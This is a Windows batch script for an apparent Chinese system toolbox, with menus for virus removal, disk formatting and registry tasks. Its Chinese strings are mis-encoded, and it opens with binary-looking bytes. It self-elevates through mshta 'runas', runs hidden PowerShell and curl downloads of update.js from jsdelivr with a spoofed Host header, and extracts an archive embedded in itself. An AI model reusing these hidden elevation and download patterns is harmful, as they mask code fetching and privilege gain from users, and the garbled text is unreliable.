goto chushihua
������ʣ������͂��������鲴������ꃤ�κ��y����뼘����ӗ�
�����@�Ѫp��������ࣚ��������v�����o��η�����l��䲗�����
���񃩝U�ЗL�^������ݒ������p�H�֛Ò�ȴ�������i���Iү����
�|�랚����ү�}�x�����Y���m�@�I�ؔ�����Z���֝������I���Ԓ�
���͔���̭���ؖ�����u��鲒��ʛ���쥔��럑�眂���L���t���
�ݘ��ⴶ䓯�N��ر�Β��������Ąm�ՠ��������G������ݞ�����
�Ҟ�����ү�ߞ���ۓ������a���Ɲp���ڕt������ⵤ�_���˅X��
ࡖ��W�Y�{��ס�K���Ԡ��[���źά�ִ���n�j̡����ئ���j�}��
������ʣ������͂��������鲴������ꃤ�κ��y����뼘����ӗ�
�����@�Ѫp��������ࣚ��������v�����o��η�����l��䲗�����
���񃩝U�ЗL�^������ݒ������p�H�֛Ò�ȴ�������i���Iү����
�|�랚����ү�}�x�����Y���m�@�I�ؔ�����Z���֝������I���Ԓ�
���͔���̭���ؖ�����u��鲒��ʛ���쥔��럑�眂���L���t���
�ݘ��ⴶ䓯�N��ر�Β��������Ąm�ՠ��������G������ݞ�����
�Ҟ�����ү�ߞ���ۓ������a���Ɲp���ڕt������ⵤ�_���˅X��
ࡖ��W�Y�{��ס�K���Ԡ��[���źά�ִ���n�j̡����ئ���j�}��
:chushihua
@echo off&cls&title ��&setlocal enabledelayedexpansion
if /i "%1"=="-ks" goto ks
if /i "%1" equ "-chrome" (
	goto chrome
)
if /i "%systemdrive%" equ "x:" goto ks
goto :tgsu
set weizhi=%0
call :su
:tgsu
fltmc 1>nul 2>nul
if "!errorlevel!" equ "0" (
	goto ks
)
verify on
set weizhi=%0
for /f "delims=" %%a in (!weizhi!) do (
	set weizhi=%%~fa
)
if exist %localappdata%\Microsoft\WindowsApps\wt.exe (
	call :stwt
) else (
	call :stcmd
)
rem ��Ȩ�����������Ԥ���������������ʼ���ٶ�
if not exist "!temp!\dos_pre_reading_cache_os.tmp" (
	wmic os get caption /value>"!temp!\dos_pre_reading_cache_os.tmp"
) else (
	type "!temp!\dos_pre_reading_cache_os.tmp"
)
if not exist "!temp!\dos_pre_reading_cache_wmictype.tmp" (
	wmic PATH Win32_SystemEnclosure get ChassisTypes/value>"!temp!\dos_pre_reading_cache_wmictype.tmp"
) else (
	type "!temp!\dos_pre_reading_cache_wmictype.tmp"
)
if not exist "!temp!\dos_pre_reading_cache_hostname.tmp" (
	hostname>"!temp!\dos_pre_reading_cache_hostname.tmp"
) else (
	type "!temp!\dos_pre_reading_cache_hostname.tmp"
)
if not exist "!temp!\dos_pre_reading_cache_zmlj.tmp" (
	reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v desktop>"!temp!\dos_pre_reading_cache_zmlj.tmp"
) else (
	type "!temp!\dos_pre_reading_cache_zmlj.tmp"
)
::start /min %comspec% /c powershell -noprofile start-process -filepath "%comspec%" -argumentlist '"/c %0 -ks"' -verb runas
::start /min %comspec% /c powershell -noprofile start-process -filepath "wt" -argumentlist '"%0 -ks"' -verb runas>nul 2>nul
exit 0
if exist "%windir%\system32\tar.exe" (
	tar -xf %0 -C %temp%>nul 2>nul
	if !errorlevel! neq 0 (
		goto curlxz
	)
	pushd %temp%
	start /min %comspec% /c dwnl https://cdn.jsdelivr.net/gh/Trustedinstall/dostool/update.js dostoolupdate>nul 2>nul
	popd
	exit 0
) else (
	for /f "delims=" %%a in ('reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\7zFM.exe" /v path^|findstr /c:"path"') do (
		set 7zpath=%%a
		set 7z1=!7zpath:~22!
		set 7z2=!7zpath:~16!
		pause
		if exist "!7z1!7z.exe" (
			"!7z1!7z.exe" x %0 -o%temp%>nul 2>nul
			if !errorlevel! neq 0 (
				goto curlxz
			)
		) else (
			"!7z2!7z.exe" x %0 -o%temp%>nul 2>nul
			if !errorlevel! neq 0 (
				goto curlxz
			)
		)
		pushd %temp%
		start /min %comspec% /c dwnl https://cdn.jsdelivr.net/gh/Trustedinstall/dostool/update.js dostoolupdate>nul 2>nul
		popd
		exit 0
	)
)
:curlxz
(
set xzflag1=
set xzflag=rem
set ddf=DownloadFile
set resolve=fastly.com:443:151.101.1.229,151.101.129.229,151.101.193.229,151.101.65.229,2a04:4e42::485,2a04:4e42:200::485,2a04:4e42:400::485,2a04:4e42:600::485
)
if exist %systemroot%\system32\curl.exe (
    set xzflag1=rem
    set xzflag=
)
%xzflag% cd /d %temp%
%xzflag% start /min %comspec% /c curl -H "host: cdn.jsdelivr.net" -L -# -C - --retry 1 --retry-delay 1 --connect-timeout 5 --resolve !resolve! -o dostoolupdate https://fastly.com/gh/Trustedinstall/dostool/update.js
%xzflag1% powershell -w hidden -c (new-object System.Net.WebClient).%ddf%( 'https://cdn.jsdelivr.net/gh/Trustedinstall/dostool/update.js','%temp%\dostoolupdate')
exit 0
:stwt
start /min %comspec% /c mshta vbscript:createobject("shell.application").shellexecute("%localappdata%\Microsoft\WindowsApps\wt.exe","%weizhi% -ks","","runas",1)(window.close)
goto :eof
:stcmd
start /min %comspec% /c mshta vbscript:createobject("shell.application").shellexecute("%weizhi%","-ks","","runas",1)(window.close)
goto :eof
set qidongjd=0
set qidongbz=����������������������������������
:qidong
cls
echo ���ڼ��ػ�������...
echo                                ��ǰ����:%qidongjd%%%
echo  ----------------------------------------------------------------------------
echo ��%qidongbz%��
echo  ----------------------------------------------------------------------------
set qidongbz=%qidongbz%��
set/a qidongjd+=5
if "%qidongjd%"=="105" goto ks
goto qidong
:ks
(
set dosqssj=%time%
title ��
color f1
setlocal enabledelayedexpansion
chcp 936>nul
set ver=20240729
set versize=237110
set resolve=--resolve fastly.com:443:^
151.101.129.57,^
151.101.193.57,^
151.101.65.57,^
151.101.1.57,^
2a04:4e42:400::313,^
2a04:4e42:200::313,^
2a04:4e42:600::313,^
2a04:4e42::313
set jshost=-H "host: cdn.jsdelivr.net"
set githost=-H "host: raw.githubusercontent.com"
set gxurlhost1=https://fastly.com/Trustedinstall/dostool/main/update.js
set gxurlhost2=https://fastly.com/gh/Trustedinstall/dostool/update.js
set gxurl1=https://raw.githubusercontent.com/Trustedinstall/dostool/main/update.js
set gxurl2=https://cdn.jsdelivr.net/gh/Trustedinstall/dostool/update.js
set gxdoshost1=https://fastly.com/Trustedinstall/dostool/main/dostool.js
set gxdoshost2=https://fastly.com/gh/Trustedinstall/dostool/dostool.js
set gxdos1=https://raw.githubusercontent.com/Trustedinstall/dostool/main/dostool.js
set gxdos2=https://cdn.jsdelivr.net/gh/Trustedinstall/dostool/dostool.js
rem if exist %temp%\dwnl.exe (set /a versize=versize+3194)
set gxflag=
set baidu=start https://www.baidu.com/s?wd=
set google=start https://www.google.com.hk/search?q=
set sc=delasd123
set scw=rdasd123
set weizhi=%0
rem set cishu=3
set ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
set nx1=[+]��һҳ&set nx=[-]��һҳ   [+]��һҳ&set nx7=[-]��һҳ
if exist "!temp!\dos_pre_reading_cache_wmictype.tmp" (
	set "wmictype='"type "!temp!\dos_pre_reading_cache_wmictype.tmp""'"
) else (
	set "wmictype='"wmic PATH Win32_SystemEnclosure get ChassisTypes /value"'"
)
for /f "tokens=2 delims=={}" %%a in (!wmictype!) do (
	if %%a==8 set nx1=[S]��һҳ&set nx=[A]��һҳ   [S]��һҳ&set nx7=[A]��һҳ
	if %%a==9 set nx1=[S]��һҳ&set nx=[A]��һҳ   [S]��һҳ&set nx7=[A]��һҳ
	if %%a==10 set nx1=[S]��һҳ&set nx=[A]��һҳ   [S]��һҳ&set nx7=[A]��һҳ
)
)
if exist "!temp!\dos_pre_reading_cache_zmlj.tmp" (
	set "zmlj=!temp!\dos_pre_reading_cache_zmlj.tmp"
) else (
	set "zmlj='"reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v desktop"'"
)
for /f "skip=2 delims=" %%a in (!zmlj!) do (
	set zmlj=%%a
	if not defined zmlj (
		set zmlj=X:\Users\Default\Desktop\
	)
	if "!zmlj:~0,1!!zmlj:~-1!" neq """" (
		for /f "delims=" %%a in ("!zmlj!") do (
			set !zmlj!="%%~a"
		)
	)
)
for /f "delims=" %%a in ("%0") do (
	set daxiao=%%~za
	set disk=%%~da
)
if exist "!temp!\dos_pre_reading_cache_hostname.tmp" (
	set "zjname=!temp!\dos_pre_reading_cache_hostname.tmp"
) else (
	set "zjname='"hostname"'"
)
for /f "delims=" %%a in (!zjname!) do set hostname=%%a
for /f "tokens=3 delims=." %%a in ('"ver"') do (
	if %%a lss 10586 (
		set winv=1
	) else (
		set winv=0
	)
)
if exist "!temp!\dos_pre_reading_cache_os.tmp" (
	set "wmicos='"type "!temp!\dos_pre_reading_cache_os.tmp""'"
) else (
	set "wmicos='"wmic os get caption /value"'"
	set comd=1
)
for /f "skip=2 tokens=2 delims==" %%a in (!wmicos!) do (
	set system=%%a
	if "!comd!" equ "1" (
		set "system=!system:~0,-1!"
		set comd=
	)
	for /f "tokens=3" %%a in ("!system!") do (
		if "%%a" equ "11" (
			call :pd11
			goto jspd
		)
		if "%%a" equ "10" (
			call :pd10
			goto jspd
		)
		if "%%a" equ "8.1" (
			call :pd8.1
			goto jspd
		)
		if "%%a" equ "8" (
			call :pd8
			goto jspd
		)
		if "%%a" equ "7" (
			call :pd7
			goto jspd
		)
		if /i "%%a" equ "XP" (
			call :pdxp
			goto jspd
		)
	)
:jspd
	if "!zmlj:~0,1!!zmlj:~-1!" neq """" (
		for /f "delims=" %%a in ('"echo %zmlj%"') do (
			set !zmlj!="%%~a"
		)
	)
)
if "%date:~11,1%" equ "��" (
	set "xingqi=%date:~11,2%"
) else (
	set "xingqi=%date:~11,3%"
)
for /f %%a in ('"echo prompt $E^ |cmd"') do (
	set cswz=%%a[
	set cswz1=%%a
)
call :list
if /i "%processor_architecture%"=="x86" (set bit=32) else (set bit=64)
if exist !systemroot!\system32\choice.exe (
	set "sel=call :choice"
) else (
	set "sel=set /p shuru=�������ѡ��:<nul"
)
if /i "%2" neq "" goto %2
rem call :xsjc !dosqssj! !time! jg
goto memuv2
for /f "delims=" %%a in ('"wmic cpu get processorid|find /i /v "processorid""') do (for /f "delims=" %%b in ('"echo %%a|find /i /v "echo""') do (set a=%%b))
for /f "delims=" %%a in ('"wmic bios get smbiosbiosversion|find /i /v "smbiosbiosversion""') do (for /f "delims=" %%b in ('"echo %%a|find /i /v "echo""') do (set b=%%b))
set jqm=%a: =%%b: =%
for /l %%a in (1,1,1000) do (if "!jqm:~%%a,1!"=="" set ws=%%a&goto jqmzh)
:jqmzh
set cs=0
set/a ws=%ws%-1
:zhcl
set/a zjzcm=0x!jqm:~%cs%,1!*2+3>nul 2>nul
set zh=%zh%%zjzcm%
set/a cs=%cs%+1
if %cs%==%ws% goto zcm
goto zhcl
:zcm
for /f "delims=" %%a in ('"reg query HKEY_CURRENT_USER\System\DOS������ /v ������ 2>nul|find "������""') do (set sfzc=%%a)
set sfzc=%sfzc:~21%
for /f "delims=" %%a in ('"reg query HKEY_CURRENT_USER\System\DOS������ /v ע���� 2>nul|find "ע����""') do (set sfzcm=%%a)
set sfzcm=%sfzcm:~21%
if /i %sfzc%==%jqm% if /i %sfzcm%==%zh% goto memuv2
:ks1
color f1
title ע������֤%system%
cls
echo                                     �˵�
echo ������%date:~0,4%��%date:~5,2%��%date:~8,2%�� %xingqi% %time:~0,8%
echo _______________________________________________________________________________
echo ������:%jqm%
set mima=
set/p mima=������ע����:
if /i "!mima!"=="!zh!" goto yes
echo ע�������
ping/n 2 0.0>nul
goto ks
:yes
cls
echo                                     �˵�
echo ������%date:~0,4%��%date:~5,2%��%date:~8,2%�� %xingqi% %time:~0,8%
echo _______________________________________________________________________________
reg add HKEY_CURRENT_USER\System\DOS������ /v ������ /d %jqm% /f>nul 2>nul
reg add HKEY_CURRENT_USER\System\DOS������ /v ע���� /d %mima% /f>nul 2>nul
echo ע��ɹ�
ping/n 2 0.0>nul
goto memuv2
:mima
color f1
title ������֤%system%
cls
echo                                     �˵�
echo ������%date:~0,4%��%date:~5,2%��%date:~8,2%�� %xingqi% %time:~0,8%
echo _______________________________________________________________________________
set mima=
set/p mima=����������:
set /p ="!mima!"<nul>%temp%\mima.tmp
call :hash %temp%\mima.tmp
del /f /q %temp%\mima.tmp
if /i "%hash%"=="DCA9A6E6D000573FDC4DF6FEBA6035B87A8CE07C" goto mima1
set/a cishu-=1
echo ��������㻹��%cishu%�λ���
ping/n 2 0.0>nul
if %cishu%==0 goto 00
goto mima
:mima1
cls
echo                                     �˵�
echo ������%date:~0,4%��%date:~5,2%��%date:~8,2%�� %xingqi% %time:~0,8%
echo _______________________________________________________________________________
echo ������ȷ��
ping/n 2 0.0>nul
goto memuv2
:memuv2
if !start! lss 1 set start=1
set /a memuys=!start!/9+1
if not defined a!start! set /a !start!=!start!-9
set color=
set color1=f
set/a color=%random%%%5
if %color%==0 set ysbak=40;97m
if %color%==1 set ysbak=44;97m
if %color%==2 set color=5&set ysbak=45;97m
if %color%==3 set ysbak=46;97m
if %color%==4 set color=7&set color1=8&set ysbak=47;90m
color %color%%color1%
set fy=!cswz!!ysbak:~0,3!91m_!cswz!!ysbak!!cswz!!ysbak:~0,3!92m_!cswz!!ysbak!!cswz!!ysbak:~0,3!93m_!cswz!!ysbak!
set fy1=___
if exist %temp%\dostoolupdate (
for /f "delims=: tokens=1" %%a in (%temp%\dostoolupdate) do (
set /a gxjg=%%a-!ver!
if !gxjg! gtr 0 (set gxflag= - ��鵽���°汾: %%a
for /f "delims=: tokens=2" %%b in (%temp%\dostoolupdate) do (set doshash="%%b")))
del /f /q %temp%\dostoolupdate)
title DOS������%system%%gxflag%
cls
rem echo;��ʼ����ʱ: !jg!
if !winv! equ 0 (echo                                     �˵� - ��!cswz!!ysbak:~0,3!92m!memuys!!cswz!!ysbak!ҳ) else (
set /p =!cswz1!�������������������������������������˵� - ��<nul
call :colortxt a !memuys!
set /p =ҳ<nul
echo;)
echo ������%date:~0,4%��%date:~5,2%��%date:~8,2%�� %xingqi% %time:~0,8%
if !winv! equ 0 (for /l %%a in (1,1,26) do (if %%a lss 26 (set /p =!fy!<nul) else (echo !fy!))) else (for /l %%a in (1,1,26) do (if %%a lss 26 (set /p =!fy1!<nul) else (echo !fy1!)))
set /a end=!start!+8
set xx=0
for /l %%a in (!start!,1,!end!) do (if defined a%%a (set /a xx=!xx!+1&echo [!xx!]!a%%a!&set xz!xx!=%%a))
set /a pd=!end!+1
if !winv! equ 0 (if not defined a!pd! (echo [0]�˳�                                             !cswz!42;97m%nx7%!cswz!!ysbak!)) else (
if not defined a!pd! (
set /p =[0]�˳�<nul
set /p =.!cswz1!����������������������������������������<nul
call :colortxt 2f %nx7%
echo;))
set /a pd1=!start!-1
if !winv! equ 0 (if !pd1! lss 1 (echo [0]�˳�                                                         !cswz!42;97m%nx1%!cswz!!ysbak!)) else (
if !pd1! lss 1 (
set /p =[0]�˳�<nul
set /p =.!cswz1!����������������������������������������<nul
call :colortxt 2f %nx1%
echo;))
if !winv! equ 0 (if defined a!pd! (if not !pd1! lss 1 echo [0]�˳�                                             !cswz!42;97m%nx1%   %nx7%!cswz!!ysbak!)) else (
if defined a!pd! (
if not !pd1! lss 1 (
set /p =[0]�˳�<nul
set /p =.!cswz1!����������������������������������������<nul
call :colortxt 2f %nx1%
set /p =.!cswz1!������<nul
call :colortxt 2f %nx7%
echo;)))
::if !start! equ 1 (echo [0]�˳�                                                         !cswz!42;97m%nx1%!cswz!!ysbak!) else (if !start! equ 64 (echo [0]�˳�                                                      !cswz!42;97m%nx7%!cswz!!ysbak!) else (echo [0]�˳�                                             !cswz!42;97m%nx%!cswz!!ysbak!))
if !winv! equ 0 (for /l %%a in (1,1,26) do (if %%a lss 26 (set /p =!fy!<nul) else (echo !fy!))) else (for /l %%a in (1,1,26) do (if %%a lss 26 (set /p =!fy1!<nul) else (echo !fy1!)))
set caidan=
set/p caidan=���������ѡ��:
if "!caidan!" equ "1" if !xz1! lss 10 (goto 0!xz1!) else (goto !xz1!)
if "!caidan!" equ "2" if !xz2! lss 10 (goto 0!xz2!) else (goto !xz2!)
if "!caidan!" equ "3" if !xz3! lss 10 (goto 0!xz3!) else (goto !xz3!)
if "!caidan!" equ "4" if !xz4! lss 10 (goto 0!xz4!) else (goto !xz4!)
if "!caidan!" equ "5" if !xz5! lss 10 (goto 0!xz5!) else (goto !xz5!)
if "!caidan!" equ "6" if !xz6! lss 10 (goto 0!xz6!) else (goto !xz6!)
if "!caidan!" equ "7" if !xz7! lss 10 (goto 0!xz7!) else (goto !xz7!)
if "!caidan!" equ "8" if !xz8! lss 10 (goto 0!xz8!) else (goto !xz8!)
if "!caidan!" equ "9" if !xz9! lss 10 (goto 0!xz9!) else (goto !xz9!)
if "!caidan!" equ "0" exit 0
if "!caidan!" equ "-" (set /a pd=!start!-1&if not !pd! lss 1 set /a start=!start!-9&goto memuv2)
if "!caidan!" equ "+" (set /a pd=!end!+1&if defined a!pd! set /a start=!start!+9&goto memuv2)
if /i "!caidan!" equ "a" (set /a pd=!start!-1&if not !pd! lss 1 set /a start=!start!-9&goto memuv2)
if /i "!caidan!" equ "s" (set /a pd=!end!+1&if defined a!pd! set /a start=!start!+9&goto memuv2)
if /i "!caidan!" equ "vbsjsq" set tzwz=!start!&goto vbsjsq
if /i "!caidan!" equ "guanji" set tzwz=!start!&goto guanji
if "!caidan!" equ "BATJIAMI" set tzwz=!start!&goto batjiami
if /i "!caidan!" equ "guanyu" set tzwz=!start!&goto guanyu
if /i "!caidan!" equ "csh" goto chushihua
if /i "!caidan!" equ "kcd" set tzwz=!start!&goto kcd
if /i "!caidan!" equ "gcd" set tzwz=!start!&goto gcd
if /i "!caidan!" equ "xz" set tzwz=!start!&goto xz
if /i "!caidan!" equ "js" set tzwz=!start!&goto 49
if /i "!caidan!" equ "gx" set tzwz=!start!&goto update
if /i "!caidan!" equ "go1" set start=1&goto memuv2
if /i "!caidan!" equ "go2" set start=10&goto memuv2
if /i "!caidan!" equ "go3" set start=19&goto memuv2
if /i "!caidan!" equ "go4" set start=28&goto memuv2
if /i "!caidan!" equ "go5" set start=37&goto memuv2
if /i "!caidan!" equ "go6" set start=46&goto memuv2
if /i "!caidan!" equ "go7" set start=55&goto memuv2
if /i "!caidan!" equ "go8" set start=64&goto memuv2
if /i "!caidan!" equ "go9" set start=73&goto memuv2
echo ��������ȷ��ѡ�
timeout /t 2 /nobreak>nul
goto memuv2
:a
set color=
set color1=f
set/a color=%random%%%5
if %color%==0 set ysbak=40;97m
if %color%==1 set ysbak=44;97m
if %color%==2 set color=5&set ysbak=45;97m
if %color%==3 set ysbak=46;97m
if %color%==4 set color=7&set color1=8&set ysbak=47;90m
color %color%%color1%
if exist %temp%\dostoolupdate (
for /f "delims=: tokens=1" %%a in (%temp%\dostoolupdate) do (
set /a gxjg=%%a-!ver!
if !gxjg! gtr 0 (set gxflag= - ��鵽���°汾: %%a
for /f "delims=: tokens=2" %%b in (%temp%\dostoolupdate) do (set doshash="%%b")))
del /f /q %temp%\dostoolupdate)
title DOS������%system%%gxflag%
cls
echo                                     �˵� - ��!cswz!!ysbak:~0,3!92m1!cswz!!ysbak!ҳ
echo ������%date:~0,4%��%date:~5,2%��%date:~8,2%�� %xingqi% %time:~0,8%
echo _______________________________________________________________________________
echo [1]���U�����lpk.dll����
echo [2]���U�����jwgkvsq.vmx�����������߸ò���
echo [3]����ϵͳ����
echo [4]��ʾϵͳ��Ϣ
echo [5]������������������
echo [6]��ʾ�������ļ�(���˸��ಡ����)
echo [7]���ע�������
echo [8]���㿪ƽ��
echo [9]�л���������ʾ��
echo [0]�˳�                                                         !cswz!42;97m%nx1%!cswz!!ysbak!
echo _______________________________________________________________________________
set caidan=
set/p caidan=���������ѡ��:
if "!caidan!"=="1" goto 01
if "!caidan!"=="2" goto 02
if "!caidan!"=="3" goto 03
if "!caidan!"=="4" goto 04
if "!caidan!"=="5" goto 05
if "!caidan!"=="6" goto 06
if "!caidan!"=="7" goto 07
if "!caidan!"=="8" goto 08
if "!caidan!"=="9" goto 09
if "!caidan!"=="0" goto 00
if "!caidan!"=="+" goto memuv2
if /i "!caidan!"=="s" goto memuv2
if /i "!caidan!"=="vbsjsq" set tzwz=a&goto vbsjsq
if /i "!caidan!"=="guanji" set tzwz=a&goto guanji
if "!caidan!"=="BATJIAMI" set tzwz=a&goto batjiami
if /i "!caidan!"=="guanyu" set tzwz=a&goto guanyu
if /i "!caidan!"=="csh" goto chushihua
if /i "!caidan!"=="kcd" set tzwz=a&goto kcd
if /i "!caidan!"=="gcd" set tzwz=a&goto gcd
if /i "!caidan!"=="xz" set tzwz=a&goto xz
if /i "!caidan!"=="js" set tzwz=a&goto 49
if /i "!caidan!"=="gx" set tzwz=a&goto update
if /i "!caidan!"=="go1" goto memuv2
if /i "!caidan!"=="go2" goto memuv2
if /i "!caidan!"=="go3" goto memuv2
if /i "!caidan!"=="go4" goto memuv2
if /i "!caidan!"=="go5" goto memuv2
if /i "!caidan!"=="go6" goto memuv2
if /i "!caidan!"=="go7" goto memuv2
if /i "!caidan!"=="go8" goto memuv2
echo ��������ȷ��ѡ�
ping/n 2 0.0>nul
goto memuv2
:b
set color=
set color1=f
set/a color=%random%%%5
if %color%==0 set ysbak=40;97m
if %color%==1 set ysbak=44;97m
if %color%==2 set color=5&set ysbak=45;97m
if %color%==3 set ysbak=46;97m
if %color%==4 set color=7&set color1=8&set ysbak=47;90m
color %color%%color1%
if exist %temp%\dostoolupdate (
for /f "delims=: tokens=1" %%a in (%temp%\dostoolupdate) do (
set /a gxjg=%%a-!ver!
if !gxjg! gtr 0 (set gxflag= - ��鵽���°汾: %%a
for /f "delims=: tokens=2" %%b in (%temp%\dostoolupdate) do (set doshash="%%b")))
del /f /q %temp%\dostoolupdate)
title DOS������%system%%gxflag%
cls
echo                                     �˵� - ��!cswz!!ysbak:~0,3!92m2!cswz!!ysbak!ҳ
echo ������%date:~0,4%��%date:~5,2%��%date:~8,2%�� %xingqi% %time:~0,8%
echo _______________________________________________________________________________
echo [1]�����̸�ʽת��ΪNTFS
echo [2]���̴����޸�
echo [3]��ʽ��
echo [4]DOS������
echo [5]���������ʾ��������
echo [6]�����������
echo [7]���KHATRA����
echo [8]��ע���
echo [9]�򿪿������
echo [0]�˳�                                             !cswz!42;97m%nx%!cswz!!ysbak!
echo _______________________________________________________________________________
set caidan=
set/p caidan=���������ѡ��:
if "!caidan!"=="1" goto 10
if "!caidan!"=="2" goto 11
if "!caidan!"=="3" goto 12
if "!caidan!"=="4" goto 13
if "!caidan!"=="5" goto 14
if "!caidan!"=="6" goto 15
if "!caidan!"=="7" goto 16
if "!caidan!"=="8" goto 17
if "!caidan!"=="9" goto 18
if "!caidan!"=="0" goto 00
if "!caidan!"=="-" goto memuv2
if "!caidan!"=="+" goto memuv2
if /i "!caidan!"=="a" goto memuv2
if /i "!caidan!"=="s" goto memuv2
if /i "!caidan!"=="vbsjsq" set tzwz=b&goto vbsjsq
if /i "!caidan!"=="guanji" set tzwz=b&goto guanji
if "!caidan!"=="BATJIAMI" set tzwz=b&goto batjiami
if /i "!caidan!"=="guanyu" set tzwz=b&goto guanyu
if /i "!caidan!"=="csh" goto chushihua
if /i "!caidan!"=="kcd" set tzwz=b&goto kcd
if /i "!caidan!"=="gcd" set tzwz=b&goto gcd
if /i "!caidan!"=="xz" set tzwz=b&goto xz
if /i "!caidan!"=="js" set tzwz=b&goto 49
if /i "!caidan!"=="gx" set tzwz=a&goto update
if /i "!caidan!"=="go1" goto memuv2
if /i "!caidan!"=="go2" goto memuv2
if /i "!caidan!"=="go3" goto memuv2
if /i "!caidan!"=="go4" goto memuv2
if /i "!caidan!"=="go5" goto memuv2
if /i "!caidan!"=="go6" goto memuv2
if /i "!caidan!"=="go7" goto memuv2
if /i "!caidan!"=="go8" goto memuv2
echo ��������ȷ��ѡ�
ping/n 2 0.0>nul
goto memuv2
:c
set color=
set color1=f
set/a color=%random%%%5
if %color%==0 set ysbak=40;97m
if %color%==1 set ysbak=44;97m
if %color%==2 set color=5&set ysbak=45;97m
if %color%==3 set ysbak=46;97m
if %color%==4 set color=7&set color1=8&set ysbak=47;90m
color %color%%color1%
if exist %temp%\dostoolupdate (
for /f "delims=: tokens=1" %%a in (%temp%\dostoolupdate) do (
set /a gxjg=%%a-!ver!
if !gxjg! gtr 0 (set gxflag= - ��鵽���°汾: %%a
for /f "delims=: tokens=2" %%b in (%temp%\dostoolupdate) do (set doshash="%%b")))
del /f /q %temp%\dostoolupdate)
title DOS������%system%%gxflag%
cls
echo                                     �˵� - ��!cswz!!ysbak:~0,3!92m3!cswz!!ysbak!ҳ
echo ������%date:~0,4%��%date:~5,2%��%date:~8,2%�� %xingqi% %time:~0,8%
echo _______________________________________________________________________________
echo [1]��DirectX��Ϲ���
echo [2]�򿪼��������
echo [3]�û�����
echo [4]�������
echo [5]DOS���������
echo [6]�ļ�ϵͳ��Ϣ��ѯ
echo [7]����ָ����С���ļ�
echo [8]����U�̲���
echo [9]������Ƭ����
echo [0]�˳�                                             !cswz!42;97m%nx%!cswz!!ysbak!
echo _______________________________________________________________________________
set caidan=
set/p caidan=���������ѡ��:
if "!caidan!"=="1" goto 19
if "!caidan!"=="2" goto 20
if "!caidan!"=="3" goto 21
if "!caidan!"=="4" goto 22
if "!caidan!"=="5" goto 23
if "!caidan!"=="6" goto 24
if "!caidan!"=="7" goto 25
if "!caidan!"=="8" goto 26
if "!caidan!"=="9" goto 27
if "!caidan!"=="0" goto 00
if "!caidan!"=="-" goto memuv2
if "!caidan!"=="+" goto memuv2
if /i "!caidan!"=="a" goto memuv2
if /i "!caidan!"=="s" goto memuv2
if /i "!caidan!"=="vbsjsq" set tzwz=c&goto vbsjsq
if /i "!caidan!"=="guanji" set tzwz=c&goto guanji
if "!caidan!"=="BATJIAMI" set tzwz=c&goto batjiami
if /i "!caidan!"=="guanyu" set tzwz=c&goto guanyu
if /i "!caidan!"=="csh" goto chushihua
if /i "!caidan!"=="kcd" set tzwz=c&goto kcd
if /i "!caidan!"=="gcd" set tzwz=c&goto gcd
if /i "!caidan!"=="xz" set tzwz=c&goto xz
if /i "!caidan!"=="js" set tzwz=c&goto 49
if /i "!caidan!"=="gx" set tzwz=c&goto update
if /i "!caidan!"=="go1" goto memuv2
if /i "!caidan!"=="go2" goto memuv2
if /i "!caidan!"=="go3" goto memuv2
if /i "!caidan!"=="go4" goto memuv2
if /i "!caidan!"=="go5" goto memuv2
if /i "!caidan!"=="go6" goto memuv2
if /i "!caidan!"=="go7" goto memuv2
if /i "!caidan!"=="go8" goto memuv2
echo ��������ȷ��ѡ�
ping/n 2 0.0>nul
goto memuv2
:d
set color=
set color1=f
set/a color=%random%%%5
if %color%==0 set ysbak=40;97m
if %color%==1 set ysbak=44;97m
if %color%==2 set color=5&set ysbak=45;97m
if %color%==3 set ysbak=46;97m
if %color%==4 set color=7&set color1=8&set ysbak=47;90m
color %color%%color1%
if exist %temp%\dostoolupdate (
for /f "delims=: tokens=1" %%a in (%temp%\dostoolupdate) do (
set /a gxjg=%%a-!ver!
if !gxjg! gtr 0 (set gxflag= - ��鵽���°汾: %%a
for /f "delims=: tokens=2" %%b in (%temp%\dostoolupdate) do (set doshash="%%b")))
del /f /q %temp%\dostoolupdate)
title DOS������%system%%gxflag%
cls
echo                                     �˵� - ��!cswz!!ysbak:~0,3!92m4!cswz!!ysbak!ҳ
echo ������%date:~0,4%��%date:~5,2%��%date:~8,2%�� %xingqi% %time:~0,8%
echo _______________________________________________________________________________
echo [1]һ��ɾ�����ļ���
echo [2]ping���������ӳ�
echo [3]Ӳ�����
echo [4]������
echo [5]DOS����
echo [6]��ʱ��
echo [7]�������������
echo [8]ɾ��ÿ���̷��µ�System Volume Information�ļ���
echo [9]������ת����
echo [0]�˳�                                             !cswz!42;97m%nx%!cswz!!ysbak!
echo _______________________________________________________________________________
set caidan=
set/p caidan=���������ѡ��:
if "!caidan!"=="1" goto 28
if "!caidan!"=="2" goto 29
if "!caidan!"=="3" goto 30
if "!caidan!"=="4" goto 31
if "!caidan!"=="5" goto 32
if "!caidan!"=="6" goto 33
if "!caidan!"=="7" goto 34
if "!caidan!"=="8" goto 35
if "!caidan!"=="9" goto 36
if "!caidan!"=="0" goto 00
if "!caidan!"=="-" goto memuv2
if "!caidan!"=="+" goto memuv2
if /i "!caidan!"=="a" goto memuv2
if /i "!caidan!"=="s" goto memuv2
if /i "!caidan!"=="vbsjsq" set tzwz=d&goto vbsjsq
if /i "!caidan!"=="guanji" set tzwz=d&goto guanji
if "!caidan!"=="BATJIAMI" set tzwz=d&goto batjiami
if /i "!caidan!"=="guanyu" set tzwz=d&goto guanyu
if /i "!caidan!"=="csh" goto chushihua
if /i "!caidan!"=="kcd" set tzwz=d&goto kcd
if /i "!caidan!"=="gcd" set tzwz=d&goto gcd
if /i "!caidan!"=="xz" set tzwz=d&goto xz
if /i "!caidan!"=="js" set tzwz=d&goto 49
if /i "!caidan!"=="gx" set tzwz=d&goto update
if /i "!caidan!"=="go1" goto memuv2
if /i "!caidan!"=="go2" goto memuv2
if /i "!caidan!"=="go3" goto memuv2
if /i "!caidan!"=="go4" goto memuv2
if /i "!caidan!"=="go5" goto memuv2
if /i "!caidan!"=="go6" goto memuv2
if /i "!caidan!"=="go7" goto memuv2
if /i "!caidan!"=="go8" goto memuv2
echo ��������ȷ��ѡ�
ping/n 2 0.0>nul
goto memuv2
:e
set color=
